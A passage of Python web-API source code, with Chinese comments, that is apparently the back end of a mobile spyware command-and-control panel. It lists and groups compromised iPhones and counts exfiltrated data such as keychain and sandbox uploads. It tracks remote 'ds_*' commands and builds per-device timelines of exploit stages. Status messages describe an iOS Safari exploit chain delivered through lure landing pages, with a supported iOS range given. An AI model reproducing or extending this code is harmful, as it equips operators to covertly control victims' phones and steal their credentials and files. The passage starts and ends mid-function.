        db.query(Device).filter(Device.group_id == group_id).update({Device.group_id: move_devices_to_group_id})
    else:
        db.query(Device).filter(Device.group_id == group_id).update({Device.group_id: None})
    db.delete(g)
    db.commit()
    username = current_user.username if current_user else "anonymous"
    create_audit_log(db, username=username, action="device_group_delete", resource_type="device_group",
                     resource_id=str(group_id), detail=f"删除设备分组 {old_name}",
                     ip_address=request.client.host if request.client else None)
    return {"message": "Group deleted"}


@router.get("")
async def get_devices(
    skip: int = 0, limit: int = 100, search: Optional[str] = None, status: Optional[str] = None,
    exploit_status: Optional[str] = None, device_uuid: Optional[str] = None, ip: Optional[str] = None,
    group_id: Optional[int] = None, ungrouped_only: Optional[bool] = False,
    os_version: Optional[str] = None, device_model: Optional[str] = None, hw_model: Optional[str] = None,
    host: Optional[str] = None, referer: Optional[str] = None, ip_location: Optional[str] = None,
    enabled: Optional[bool] = None, disabled_only: Optional[bool] = False,
    compatible: Optional[str] = None, channel_id: Optional[int] = None, template_id: Optional[int] = None,
    agent_id: Optional[int] = None, sort: Optional[str] = "last_seen", order: Optional[str] = "desc",
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    query = db.query(Device)
    query = apply_agent_filter_device(query, db, current_user)
    if search and search.strip():
        q = search.strip()
        like = f"%{q}%"
        query = query.filter(or_(
            Device.device_uuid.like(like), Device.ip.like(like), Device.device_model.like(like),
            Device.hw_model.like(like), Device.os_version.like(like), Device.chipset.like(like),
            Device.user_agent.like(like), Device.note.like(like), Device.host.like(like),
            Device.referer.like(like), Device.access_path.like(like), Device.ip_location.like(like),
        ))
    if status: query = query.filter(Device.status == status)
    if exploit_status: query = query.filter(Device.exploit_status == exploit_status)
    if device_uuid: query = query.filter(Device.device_uuid.contains(device_uuid))
    if ip: query = query.filter(Device.ip.contains(ip))
    if group_id is not None: query = query.filter(Device.group_id == group_id)
    if ungrouped_only: query = query.filter(Device.group_id.is_(None))
    if os_version: query = query.filter(Device.os_version == os_version)
    if device_model: query = query.filter(Device.device_model == device_model)
    if hw_model: query = query.filter(Device.hw_model == hw_model)
    if host: query = query.filter(Device.host.contains(host))
    if referer: query = query.filter(Device.referer.contains(referer))
    if ip_location: query = query.filter(Device.ip_location.contains(ip_location))
    if channel_id is not None:
        if int(channel_id) <= 0: query = query.filter(Device.channel_id.is_(None))
        else: query = query.filter(Device.channel_id == int(channel_id))
    if template_id is not None:
        if int(template_id) <= 0: query = query.filter(Device.template_id.is_(None))
        else: query = query.filter(Device.template_id == int(template_id))
    if agent_id is not None:
        if int(agent_id) <= 0: query = query.filter(Device.agent_id.is_(None))
        else: query = query.filter(Device.agent_id == int(agent_id))
    if enabled is True: query = query.filter(Device.enabled == 1)
    elif enabled is False or disabled_only: query = query.filter(Device.enabled == 0)
    if compatible:
        all_rows = query.with_entities(Device.id, Device.os_version).all()
        matched_ids = {rid for rid, ver in all_rows if compatible == _is_ios_compatible(ver) or (compatible == "unknown" and _is_ios_compatible(ver) is None)}
        if not matched_ids:
            return {"total": 0, "items": []}
        query = query.filter(Device.id.in_(matched_ids))
    total = query.count()
    order_func = desc if (order or "desc").lower() != "asc" else asc
    sort_col = {
        "last_seen": Device.last_seen, "first_seen": Device.first_seen, "os_version": Device.os_version,
        "device_model": Device.device_model, "hw_model": Device.hw_model, "status": Device.status,
        "ip": Device.ip, "group_id": Device.group_id, "host": Device.host, "ip_location": Device.ip_location,
        "enabled": Device.enabled,
    }.get((sort or "last_seen").lower(), Device.last_seen)
    query = query.order_by(order_func(sort_col))
    devices = query.offset(skip).limit(limit).all()
    cutoff = datetime.now() - timedelta(minutes=5)
    for d in devices:
        if d.last_seen and isinstance(d.last_seen, datetime) and d.last_seen >= cutoff:
            d.status = "active"
        else:
            d.status = "offline"
    group_map, channel_map, template_map = {}, {}, {}
    try:
        gids = [d.group_id for d in devices if d.group_id is not None]
        if gids:
            for g in db.query(DeviceGroup).filter(DeviceGroup.id.in_(gids)).all():
                group_map[g.id] = {"id": g.id, "name": g.name, "color": g.color}
        cids = [d.channel_id for d in devices if getattr(d, "channel_id", None) is not None]
        if cids:
            for c in db.query(TrafficChannel).filter(TrafficChannel.id.in_(cids)).all():
                channel_map[c.id] = {"id": c.id, "slug": c.slug, "name": c.name, "color": c.color}
        tids = [d.template_id for d in devices if getattr(d, "template_id", None) is not None]
        if tids:
            for t in db.query(LandingTemplate).filter(LandingTemplate.id.in_(tids)).all():
                template_map[t.id] = {"id": t.id, "slug": t.slug, "name": t.name}
    except Exception:
        pass

    def _to_dict(d: Device):
        dct = {c.name: getattr(d, c.name) for c in d.__table__.columns}
        for k in ("first_seen", "last_seen", "last_command_time"):
            if isinstance(dct.get(k), datetime):
                dct[k] = dct[k].isoformat()
        if d.group_id and d.group_id in group_map:
            dct["group"] = group_map[d.group_id]
            dct["group_name"] = group_map[d.group_id].get("name")
            dct["group_color"] = group_map[d.group_id].get("color")
        else:
            dct["group"] = dct["group_name"] = dct["group_color"] = None
        if d.channel_id and d.channel_id in channel_map:
            c = channel_map[d.channel_id]
            dct["channel_slug"] = c.get("slug"); dct["channel_name"] = c.get("name"); dct["channel_color"] = c.get("color")
        else:
            dct["channel_slug"] = dct["channel_name"] = dct["channel_color"] = None
        if d.template_id and d.template_id in template_map:
            t = template_map[d.template_id]
            dct["template_slug"] = t.get("slug"); dct["template_name"] = t.get("name")
        else:
            dct["template_slug"] = dct["template_name"] = None
        parsed = _parse_ua_v2(d.user_agent) if d.user_agent else {}
        model_from_hw = _guess_model_from_hw_model(getattr(d, "hw_model", None))
        if model_from_hw and (not dct.get("device_model") or dct["device_model"] in ("iPhone", "iPad", "iPod Touch", "Android", "Mac")):
            dct["device_model"] = model_from_hw
        chip = _guess_chipset(
            getattr(d, "hw_model", None),
            model_from_hw or dct.get("device_model"),
            dct.get("os_version"),
            parsed.get("device_family"),
        )
        if chip and (not dct.get("chipset")):
            dct["chipset"] = chip
        elif chip and dct.get("chipset") and ("/" not in str(dct["chipset"])) and ("/" in chip):
            dct["chipset"] = chip
        os_ver_from_ua = parsed.get("os_version")
        def _maj(v):
            try:
                return int(str(v).split(".")[0])
            except Exception:
                return 0
        if os_ver_from_ua and (not dct.get("os_version")):
            dct["os_version"] = os_ver_from_ua
        elif os_ver_from_ua and dct.get("os_version"):
            try:
                maj_old = _maj(dct["os_version"])
                maj_new = _maj(os_ver_from_ua)
                if maj_new > maj_old or maj_old > 25 >= maj_new:
                    dct["os_version"] = os_ver_from_ua
            except (ValueError, TypeError, IndexError):
                pass
        if not dct.get("os_version") and parsed.get("safari_version_raw"):
            maj_saf = _maj(parsed["safari_version_raw"])
            maj_cpu = _maj(parsed.get("os_version") or "0")
            if maj_saf > 0 and maj_saf > maj_cpu:
                dct["os_version"] = parsed["safari_version_raw"]
        bname = parsed.get("browser_name")
        dct["browser_name"] = bname
        dct["browser_version"] = parsed.get("browser_version")
        dct["webkit_version"] = parsed.get("webkit_version")
        dct["os_type"] = parsed.get("os_type")
        if parsed.get("browser_version") and (not dct.get("safari_version")):
            dct["safari_version"] = parsed["browser_version"]
        dct["compatible_level"] = _is_ios_compatible(dct.get("os_version"), bname)
        return dct
    return {"total": total, "items": [_to_dict(d) for d in devices]}


@router.get("/stats")
async def get_device_stats(db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    total_devices = apply_agent_filter_device(db.query(func.count(Device.id)), db, current_user).scalar() or 0
    cutoff = datetime.now() - timedelta(minutes=5)
    active_devices = apply_agent_filter_device(
        db.query(func.count(Device.id)).filter(Device.last_seen >= cutoff),
        db, current_user
    ).scalar() or 0
    offline_devices = int(total_devices or 0) - int(active_devices or 0)
    if offline_devices < 0:
        offline_devices = 0
    total_exfil = apply_agent_filter_exfil(db.query(func.count(ExfilData.id)), db, current_user).scalar() or 0
    total_commands = apply_agent_filter_command(db.query(func.count(Command.id)), db, current_user).scalar() or 0
    pending_commands = apply_agent_filter_command(db.query(func.count(Command.id)).filter(Command.status == "pending"), db, current_user).scalar() or 0
    today_start = datetime.combine(datetime.now().date(), datetime.min.time())
    today_new_devices = apply_agent_filter_device(db.query(func.count(Device.id)).filter(Device.first_seen >= today_start), db, current_user).scalar() or 0
    scope, aid = _resolve_scope(db, current_user)
    by_os_q = apply_agent_filter_device(db.query(Device.os_version, func.count(Device.id)), db, current_user).group_by(Device.os_version)
    by_os = dict(by_os_q.all())
    by_model_q = apply_agent_filter_device(db.query(Device.device_model, func.count(Device.id)), db, current_user).group_by(Device.device_model)
    by_model = dict(by_model_q.all())
    by_g_raw = apply_agent_filter_device(db.query(Device.group_id, func.count(Device.id)), db, current_user).group_by(Device.group_id).all()
    group_map = {}
    try:
        group_q = apply_agent_filter_group(db.query(DeviceGroup), db, current_user)
        for g in group_q.all(): group_map[g.id] = g.name
    except Exception:
        pass
    by_group = {}
    for gid, cnt in by_g_raw:
        by_group[group_map.get(gid, "未分组") if gid is not None else "未分组"] = cnt
    return {
        "total_devices": int(total_devices or 0), "active_devices": int(active_devices or 0),
        "offline_devices": int(offline_devices or 0), "today_new_devices": int(today_new_devices or 0),
        "total_exfil": int(total_exfil or 0), "total_commands": int(total_commands or 0),
        "pending_commands": int(pending_commands or 0),
        "by_os_version": by_os, "by_model": by_model, "by_group": by_group,
    }


def _resolve_scope(db, user):
    from ._helpers import _resolve_agent_scope
    return _resolve_agent_scope(db, user)


@router.get("/{device_uuid}/heartbeats")
async def get_device_heartbeats(
    device_uuid: str, limit: int = 100, skip: int = 0,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    base_ip = (device.ip or "127.0.0.1").strip() or "127.0.0.1"
    base_battery = int(getattr(device, "battery", 0) or 0) or None
    events = []

    def _push(ts, status, ip=None, battery=None, src="device"):
        if ts is None: return
        if not isinstance(ts, datetime):
            try:
                ts = datetime.fromisoformat(str(ts).replace("Z", ""))
            except Exception:
                return
        b = battery
        if b is None:
            try:
                b = base_battery if isinstance(base_battery, int) else None
            except Exception:
                b = None
        events.append({
            "device_uuid": device_uuid,
            "ip": ip or base_ip,
            "battery": b if isinstance(b, int) else None,
            "status": status if status in ("online", "offline") else "online",
            "source": src,
            "created_at": ts.isoformat() if isinstance(ts, datetime) else str(ts),
        })

    _push(device.first_seen, "online", src="first_seen")
    last = device.last_seen if isinstance(device.last_seen, datetime) else None
    cutoff = datetime.now() - timedelta(minutes=5)
    active = (last is not None) and (last >= cutoff)
    _push(last, "online" if active else "offline", src="last_seen")

    try:
        cmd_rows = (
            db.query(Command)
            .filter(Command.device_uuid == device_uuid)
            .order_by(desc(Command.executed_at if Command.executed_at is not None else Command.created_at))
            .limit(50)
            .all()
        )
        for c in cmd_rows:
            t = c.executed_at if isinstance(c.executed_at, datetime) else c.created_at
            _push(t, "online", src=f"command:{c.status or 'pending'}")
    except Exception:
        pass

    try:
        exfil_rows = (
            db.query(ExfilData)
            .filter(ExfilData.device_uuid == device_uuid)
            .order_by(desc(ExfilData.uploaded_at))
            .limit(50)
            .all()
        )
        for e in exfil_rows:
            t = e.uploaded_at if isinstance(e.uploaded_at, datetime) else None
            cat = getattr(e, "category", None) or "exfil"
            _push(t, "online", src=f"exfil:{cat}")
    except Exception:
        pass

    events.sort(key=lambda x: x["created_at"], reverse=True)
    seen = set()
    dedup = []
    for ev in events:
        key = (ev["created_at"], ev["source"])
        if key in seen: continue
        seen.add(key)
        dedup.append(ev)
    total = len(dedup)
    items = dedup[skip:skip + limit]
    return {"total": total, "items": items}


def _safe_str(v, max_len=300):
    try:
        if v is None:
            return ""
        s = str(v)
        if len(s) > max_len:
            s = s[:max_len] + f" ...(+{len(s) - max_len})"
        return s
    except Exception:
        return ""


def _evt(ts, kind, source, title, detail="", tags=None, ip=None, level="info", code=None, extra=None):
    if ts is None:
        return None
    if not isinstance(ts, datetime):
        try:
            ts = datetime.fromisoformat(str(ts).replace("Z", ""))
        except Exception:
            return None
    obj = {
        "time": ts.isoformat(),
        "type": kind or "misc",
        "source": source or "",
        "title": title or "",
        "detail": detail or "",
        "tags": list(tags or []),
        "level": level or "info",
    }
    if ip is not None:
        obj["ip"] = ip
    if code is not None:
        obj["status_code"] = int(code)
    if isinstance(extra, dict):
        try:
            for k, v in extra.items():
                if v is None:
                    continue
                if k in ("time", "type", "source", "title", "detail", "tags", "level", "ip", "status_code"):
                    continue
                obj[k] = v
        except Exception:
            pass
    return obj


@router.get("/{device_uuid}/logs")
async def get_device_logs(
    device_uuid: str, limit: int = 200, skip: int = 0, tail_log: int = 0,
    db: Session = Depends(get_db), current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    assert_owns_device(db, current_user, device)
    base_ip = (device.ip or "").strip() or None
    events = []
    _dbg = {
        "http_row_count": None, "http_event_count": 0, "http_err": None,
        "cmd_row_count": None, "cmd_event_count": 0, "cmd_err": None,
        "exfil_row_count": None, "exfil_event_count": 0, "exfil_err": None,
        "lifecycle_event_count": 0, "lifecycle_err": None,
        "exploit_event_count": 0, "exploit_err": None,
        "xlog_row_count": None, "xlog_event_count": 0, "xlog_err": None,
        "tail_log": 0, "tail_log_file": None, "tail_log_lines": 0,
        "tail_log_err": None,
        "db": None,
    }

    # 1) HTTP request logs (Log table)
    try:
        log_rows = (
            db.query(Log)
            .filter(Log.device_uuid == device_uuid)
            .order_by(desc(Log.timestamp))
            .limit(min(limit + 200, 800))
            .all()
        )
        _dbg["http_row_count"] = len(log_rows)
        _before = len(events)
        for l in log_rows:
            method = _safe_str(getattr(l, "method", None), 12) or "-"
            path = _safe_str(getattr(l, "path", None), 200) or "-"
            code = getattr(l, "status_code", None)
            lvl = "info"
            if code is not None:
                try:
                    c = int(code)
                    if c >= 500:
                        lvl = "error"
                    elif c >= 400:
                        lvl = "warn"
                except Exception:
                    pass
            log_type = _safe_str(getattr(l, "log_type", None), 20)
            ua = _safe_str(getattr(l, "user_agent", None), 120)
            title = f"{method} {path}"
            detail_parts = []
            if log_type:
                detail_parts.append(f"log_type={log_type}")
            if ua:
                detail_parts.append(f"ua={ua}")
            if code is not None:
                detail_parts.append(f"status={code}")
            clen = getattr(l, "content_length", None)
            if clen:
                detail_parts.append(f"bytes={clen}")
            evt = _evt(
                getattr(l, "timestamp", None),
                "http", log_type or "request",
                title, " | ".join(detail_parts),
                tags=[method] + ([log_type] if log_type else []),
                ip=getattr(l, "ip", None) or base_ip,
                level=lvl, code=code,
                extra={"method": method, "path": path, "ua": ua, "log_type": log_type,
                       "content_length": clen, "log_id": getattr(l, "id", None)},
            )
            if evt:
                events.append(evt)
        _dbg["http_event_count"] = len(events) - _before
    except Exception as _e:
        _dbg["http_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
        try:
            import traceback as _tb
            _dbg["http_tb"] = _tb.format_exc()[:2000]
        except Exception:
            pass
    finally:
        try: _dbg["db"] = str(db.bind.url) if getattr(db, "bind", None) else None
        except Exception: _dbg["db"] = "?"

    # 2) Commands (Command table)
    try:
        cmd_rows = (
            db.query(Command)
            .filter(Command.device_uuid == device_uuid)
            .order_by(desc(Command.executed_at if Command.executed_at is not None else Command.created_at))
            .limit(min(limit + 100, 500))
            .all()
        )
        _dbg["cmd_row_count"] = len(cmd_rows)
        _before = len(events)
        for c in cmd_rows:
            cmd_text = _safe_str(c.command, 200) or "(empty)"
            status = _safe_str(getattr(c, "status", None), 20) or "unknown"
            st_low = status.lower()
            lvl = "info"
            if st_low in ("failed", "error", "timeout"):
                lvl = "error"
            elif st_low in ("pending", "deferred", "stale"):
                lvl = "warn"
            elif st_low in ("completed", "success", "ok"):
                lvl = "success"
            elif st_low == "executing":
                lvl = "debug"
            ts = getattr(c, "executed_at", None) or getattr(c, "created_at", None)
            out_snip = ""
            out_raw = getattr(c, "output", None)
            if out_raw:
                out_snip = _safe_str(out_raw, 500)
            cmd_id = getattr(c, "id", None)
            title = f"[CMD {status.upper()}] {cmd_text}"
            detail_parts = []
            if ts == getattr(c, "executed_at", None):
                created_at = getattr(c, "created_at", None)
                if isinstance(created_at, datetime):
                    detail_parts.append(f"created_at={created_at.isoformat()}")
            if out_snip:
                detail_parts.append(f"output={out_snip}")
            evt = _evt(
                ts, "command", f"command:{status}",
                title, " | ".join(detail_parts),
                tags=[f"cmd:{status}", "command"],
                ip=base_ip, level=lvl,
                extra={"command": cmd_text, "status": status, "cmd_id": cmd_id,
                       "created_at": _safe_str(getattr(c, "created_at", None), 40),
                       "executed_at": _safe_str(getattr(c, "executed_at", None), 40),
                       "output_preview": out_snip},
            )
            if evt:
                events.append(evt)
        _dbg["cmd_event_count"] = len(events) - _before
    except Exception as _e:
        _dbg["cmd_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
        try:
            import traceback as _tb
            _dbg["cmd_tb"] = _tb.format_exc()[:2000]
        except Exception:
            pass

    # 3) ExfilData uploads
    try:
        exfil_rows = (
            db.query(ExfilData)
            .filter(ExfilData.device_uuid == device_uuid)
            .order_by(desc(ExfilData.uploaded_at))
            .limit(min(limit + 100, 500))
            .all()
        )
        _dbg["exfil_row_count"] = len(exfil_rows)
        _before = len(events)
        for e in exfil_rows:
            cat = _safe_str(getattr(e, "category", None), 30) or "exfil"
            description_text = _safe_str(getattr(e, "description", None), 200)
            fp = _safe_str(getattr(e, "file_path", None) or getattr(e, "path", None), 300)
            fs = getattr(e, "file_size", None)
            ts = getattr(e, "uploaded_at", None) or getattr(e, "created_at", None)
            fsize_h = ""
            if isinstance(fs, int):
                if fs < 1024:
                    fsize_h = f"{fs} B"
                elif fs < 1024 * 1024:
                    fsize_h = f"{fs/1024:.1f} KB"
                else:
                    fsize_h = f"{fs/1024/1024:.2f} MB"
            title = f"[EXFIL {cat.upper()}] {description_text or fp or '(no description)'}"
            detail_parts = []
            if cat:
                detail_parts.append(f"category={cat}")
            if fsize_h:
                detail_parts.append(f"size={fsize_h}")
            if fp:
                detail_parts.append(f"file={fp}")
            evt = _evt(
                ts, "exfil", f"exfil:{cat}",
                title, " | ".join(detail_parts),
                tags=[f"exfil:{cat}", "upload", "exfil"],
                ip=base_ip, level="success",
                extra={"category": cat, "description": description_text, "file_path": fp,
                       "file_size": fs, "file_size_h": fsize_h,
                       "exfil_id": getattr(e, "id", None)},
            )
            if evt:
                events.append(evt)
        _dbg["exfil_event_count"] = len(events) - _before
    except Exception as _e:
        _dbg["exfil_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
        try:
            import traceback as _tb
            _dbg["exfil_tb"] = _tb.format_exc()[:2000]
        except Exception:
            pass

    # 4) Lifecycle heartbeats (first_seen / last_seen + exploit_status)
    try:
        _before = len(events)
        fs = getattr(device, "first_seen", None)
        if isinstance(fs, datetime):
            ev_first = _evt(
                fs, "device", "first_seen", "设备首次上线 / 注册",
                f"ip={base_ip or '-'} | exploit_status={_safe_str(getattr(device, 'exploit_status', None), 20) or 'pending'}",
                tags=["lifecycle", "first_seen", "register"],
                ip=base_ip, level="success",
                extra={"ua": _safe_str(getattr(device, "user_agent", None), 200),
                       "os": _safe_str(getattr(device, "os_version", None), 20),
                       "exploit_status": _safe_str(getattr(device, "exploit_status", None), 30)},
            )
            if ev_first:
                events.append(ev_first)
        ls = getattr(device, "last_seen", None)
        if isinstance(ls, datetime):
            cutoff = datetime.now() - timedelta(minutes=5)
            is_on = ls >= cutoff
            ev_last = _evt(
                ls, "device", "last_seen", f"最近心跳（{'在线' if is_on else '离线'}）",
                f"ip={base_ip or '-'} | enabled={'YES' if (getattr(device, 'enabled', 1) or 1) else 'NO'}",
                tags=["lifecycle", "last_seen", "heartbeat"],
                ip=base_ip, level="info" if not is_on else "success",
                extra={"is_online": bool(is_on),
                       "enabled": bool(getattr(device, "enabled", 1) or 1)},
            )
            if ev_last:
                events.append(ev_last)
        _dbg["lifecycle_event_count"] = len(events) - _before
    except Exception as _e:
        _dbg["lifecycle_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
        try:
            import traceback as _tb
            _dbg["lifecycle_tb"] = _tb.format_exc()[:2000]
        except Exception:
            pass

    # 5) Exploit stage changes: infer from commands / exfil:sandbox vs exfil:keychain
    try:
        es = _safe_str(getattr(device, "exploit_status", None), 30).lower()
        if es in ("success", "exploited", "complete", "ok"):
            # Find first non-sandbox exfil or earliest completed ds_info
            stage_ts = None
            try:
                non_sand = (
                    db.query(ExfilData)
                    .filter(ExfilData.device_uuid == device_uuid)
                    .filter(ExfilData.category.notin_(["sandbox"]))
                    .order_by(asc(ExfilData.uploaded_at))
                    .limit(1)
                    .first()
                )
                if non_sand:
                    stage_ts = getattr(non_sand, "uploaded_at", None)
            except Exception:
                non_sand = None
            if stage_ts is None:
                try:
                    info_cmd = (
                        db.query(Command)
                        .filter(Command.device_uuid == device_uuid)
                        .filter(Command.command.like("%ds_info%"))
                        .filter(Command.status.in_(["completed", "success", "ok"]))
                        .order_by(asc(Command.executed_at if Command.executed_at is not None else Command.created_at))
                        .limit(1)
                        .first()
                    )
                    if info_cmd:
                        stage_ts = getattr(info_cmd, "executed_at", None) or getattr(info_cmd, "created_at", None)
                except Exception:
                    info_cmd = None
            if stage_ts is None:
                stage_ts = ls
            ev_exp = _evt(
                stage_ts, "exploit", f"exploit:{es or 'success'}",
                f"漏洞利用完成（exploit_status={es or 'success'}），已进入命令执行阶段",
                "iOS Safari exploit chain 执行成功，可下发 ds_* 控制命令",
                tags=["exploit", "exploited", "success"],
                ip=base_ip, level="success",
                extra={"exploit_status": es or "success"},
            )
            if ev_exp:
                events.append(ev_exp)
        elif es in ("pending", "in_progress", "running"):
            ev_pend = _evt(
                ls, "exploit", f"exploit:{es or 'pending'}",
                f"漏洞利用中（exploit_status={es or 'pending'}）",
                "等待 iPhone Safari 点击落地页按钮触发完整 exploit chain，完成后 exploit_status 将变为 success",
                tags=["exploit", "pending", "warn"],
                ip=base_ip, level="warn",
                extra={"exploit_status": es or "pending",
                       "hint": "请用 Safari 打开 /ch/<slug>?tpl=<tpl> 并点击按钮，观察 Stage1/2/3 是否 200"},
            )
            if ev_pend:
                events.append(ev_pend)
        elif es in ("failed", "error"):
            ev_fail = _evt(
                ls, "exploit", f"exploit:{es or 'failed'}",
                f"漏洞利用失败（exploit_status={es or 'failed'}）",
                "请检查 iOS 版本是否在支持区间（13.0~17.2）、Stage payload 文件是否存在、是否使用 Safari 浏览器",
                tags=["exploit", "failed"],
                ip=base_ip, level="error",
                extra={"exploit_status": es or "failed"},
            )
            if ev_fail:
                events.append(ev_fail)
    except Exception:
        pass

    # 6) Exploit console logs (DeviceExploitLog 表 - 浏览器端 group.html 上报的 STAGE1/STAGE2/PAC/... 细粒度日志)
    try:
        import json as _json
        ex_rows = (
            db.query(DeviceExploitLog)
            .filter(DeviceExploitLog.device_uuid == device_uuid)
            .order_by(desc(DeviceExploitLog.timestamp))
            .limit(min(limit + 300, 1000))
            .all()
        )
        for x in ex_rows:
            lvl_raw = _safe_str(getattr(x, "level", None), 12).lower() or "log"
            msg = _safe_str(getattr(x, "message", None), 4000)
            if not msg:
                continue
            phase = _safe_str(getattr(x, "phase", None), 30)
            ts = getattr(x, "timestamp", None)
            title = ""
            if phase:
                title = f"[{phase.upper()}] {msg[:120]}"
            else:
                head = msg[:120]
                # 自动识别前缀 STAGE1/STAGE2/STAGE3/PAC/LOADER/C2 -> 作为 phase 标签
                m_ph = re.match(r"^\s*\[?\s*(STAGE[123]|LOADER|PAC|C2|EXPLOIT|PAYLOAD|FETCH)\s*\]?\s*[:：\- ]?", msg, flags=re.IGNORECASE)
                if m_ph:
                    phase = m_ph.group(1).upper()
                    title = f"[{phase}] {msg[:120]}"
                else:
                    title = head
            # 标签
            tags = [f"exploit_console"]
            if phase:
                tags.append(f"phase:{phase.lower()}")
            # level 映射到事件 level
            lvl = "debug"
            if lvl_raw in ("error", "fatal"):
                lvl = "error"
            elif lvl_raw == "warn":
                lvl = "warn"
            elif lvl_raw == "info":
                lvl = "info"
            elif lvl_raw == "success" or ("success" in msg.lower() and "fail" not in msg.lower()):
                lvl = "success"
            extra = {"phase": phase, "level_raw": lvl_raw, "log_id": getattr(x, "id", None)}
            try:
                tj = getattr(x, "tags_json", None)
                if tj:
                    extra["tags_raw"] = _json.loads(tj)
            except Exception:
                pass
            try:
                ej = getattr(x, "extra_json", None)
                if ej:
                    extra["extra"] = _json.loads(ej)
            except Exception:
                pass
            src_ip = getattr(x, "source_ip", None) or base_ip
            evt = _evt(
                ts, "exploit_console", phase or "exploit_log",
                title, msg, tags=tags, ip=src_ip, level=lvl,
                extra=extra,
            )
            if evt:
                events.append(evt)
    except Exception:
        pass

    # 7) Tail device-specific log file (logs/devices/YYYYMMDD/{uuid}.log 末尾 N 行 — 用户建议按日期+UUID 生成文件)
    if tail_log:
        try:
            from pathlib import Path as _P
            import re as _re
            _dbg["tail_log"] = 1
            # 读取的行数：优先 tail_log 传入的数值，> 10 就按传入，否则默认 100
            n_lines = int(tail_log) if isinstance(tail_log, int) and tail_log > 10 else 100
            safe_uuid = "".join(ch for ch in str(device_uuid).strip() if ch.isalnum() or ch in ("-", "_"))[:64]
            # 先尝试当日目录，没有再回溯最近 3 天
            now = datetime.now()
            tried_paths = []
            chosen_path = None
            for day_offset in range(4):
                day = now - timedelta(days=day_offset)
                date_str = day.strftime("%Y%m%d")
                # 优先从 exploit_server 的目录结构找：server/logs/devices/YYYYMMDD/{uuid}.log
                candidate = _P(__file__).resolve().parent.parent.parent / "logs" / "devices" / date_str / f"{safe_uuid}.log"
                tried_paths.append(str(candidate))
                if candidate.exists():
                    chosen_path = candidate
                    break
                # 兼容：直接相对路径 server/logs/devices/
                candidate2 = _P("server/logs/devices") / date_str / f"{safe_uuid}.log"
                tried_paths.append(str(candidate2))
                if candidate2.exists():
                    chosen_path = candidate2
                    break
                # 兼容：logs/devices/
                candidate3 = _P("logs/devices") / date_str / f"{safe_uuid}.log"
                tried_paths.append(str(candidate3))
                if candidate3.exists():
                    chosen_path = candidate3
                    break
            _dbg["tail_log_file"] = str(chosen_path) if chosen_path else None
            _dbg["tail_log_tried"] = tried_paths
            if chosen_path and chosen_path.is_file():
                try:
                    with open(chosen_path, "r", encoding="utf-8", errors="replace") as _lf:
                        all_lines = _lf.readlines()
                    tail_lines = all_lines[-n_lines:] if len(all_lines) > n_lines else all_lines
                    _dbg["tail_log_lines"] = len(tail_lines)
                    _ts_re = _re.compile(r"^\s*\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s*(.*)$")
                    _lvl_re = _re.compile(r"\[(ERROR|WARN|WARNING|INFO|DEBUG|FATAL|SUCCESS|ERR)\]", _re.IGNORECASE)
                    _before = len(events)
                    for raw_line in tail_lines:
                        line = raw_line.rstrip("\n").rstrip("\r")
                        if not line.strip():
                            continue
                        ts_match = _ts_re.match(line)
                        ts_dt = None
                        body = line
                        if ts_match:
                            ts_str = ts_match.group(1)
                            body = ts_match.group(2).strip()
                            try:
                                ts_dt = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S")
                            except Exception:
                                ts_dt = None
                        # 检测 level
                        lvl = "info"
                        lvl_m = _lvl_re.search(body)
                        if lvl_m:
                            lvl_raw = lvl_m.group(1).upper()
                            if lvl_raw in ("ERROR", "FATAL", "ERR"):
                                lvl = "error"
                            elif lvl_raw in ("WARN", "WARNING"):
                                lvl = "warn"
                            elif lvl_raw == "SUCCESS":
                                lvl = "success"
                            elif lvl_raw == "DEBUG":
                                lvl = "debug"
                        else:
                            bl = body.lower()
                            if any(k in bl for k in ("error", "exception", "failed", "fail", "fatal", "err ")):
                                lvl = "error"
                            elif any(k in bl for k in ("warn", "stale", "defer", "concurrency", "reset")):
                                lvl = "warn"
                            elif any(k in bl for k in ("success", "ok ", "complete", "pickup", "exploited", "registered", "register")):
                                lvl = "success"
                        # phase 识别
                        phase = None
                        _ph_m = _re.match(r"^\s*\[?\s*(CMD-[A-Z_]+|STAGE[123]|LOADER|PAC|C2|EXPLOIT|UPLOAD|REPORT|NATIVE|SAFARI|HARVEST|EXFIL)\s*\]?\s*[:：\- ]?", body, flags=_re.IGNORECASE)
                        if _ph_m:
                            phase = _ph_m.group(1).upper()
                        # 标题
                        title = body[:160] if len(body) <= 160 else body[:160] + "..."
                        detail = body
                        tags = ["raw_log"]
                        if phase:
                            tags.append(phase.lower().replace(" ", "_"))
                        evt = _evt(
                            ts_dt, "raw_log", phase or "server_log",
                            title, detail, tags=tags, ip=base_ip, level=lvl,
                            extra={"source": "file", "file": str(chosen_path), "phase": phase},
                        )
                        if evt:
                            events.append(evt)
                    _dbg["tail_log_event_count"] = len(events) - _before
                except Exception as _fe:
                    _dbg["tail_log_err"] = f"read_file: {type(_fe).__name__}: {str(_fe)[:300]}"
                    try:
                        import traceback as _tb
                        _dbg["tail_log_tb"] = _tb.format_exc()[:1500]
                    except Exception:
                        pass
        except Exception as _e:
            _dbg["tail_log_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
            try:
                import traceback as _tb
                _dbg["tail_log_tb"] = _tb.format_exc()[:1500]
            except Exception:
                pass

    # Sort + dedup + paginate
    def _sort_key(ev):
        return (ev.get("time") or "", 0)
    events.sort(key=_sort_key, reverse=True)
    seen = set()
    dedup = []
    for ev in events:
        key = (ev.get("time") or "", ev.get("type") or "", ev.get("source") or "",
               (ev.get("title") or "")[:60])
        if key in seen:
            continue
        seen.add(key)
        dedup.append(ev)
    total = len(dedup)
    items = dedup[skip: skip + max(1, min(limit, 500))]

    # Summary counters
